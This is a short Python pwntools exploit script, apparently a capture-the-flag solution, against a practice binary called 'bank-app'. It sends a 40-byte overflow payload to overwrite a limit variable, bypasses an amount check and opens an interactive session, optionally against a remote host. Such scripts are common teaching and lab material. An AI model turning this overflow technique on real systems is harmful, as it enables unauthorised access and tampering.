#!/usr/bin/python3
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exe = './bank-app'

elf = context.binary = ELF(exe, checksec=False)

# Start program
io = start()

io.sendline(b"100")

# Overwrite the max variable with a value smaller than 1000
payload = 40*b"A"

io.sendline(payload)

io.sendline(b"y")

# Insert a value higher than 778
io.sendline(b"802")

io.sendline(b"This is a test comment")

io.interactive()
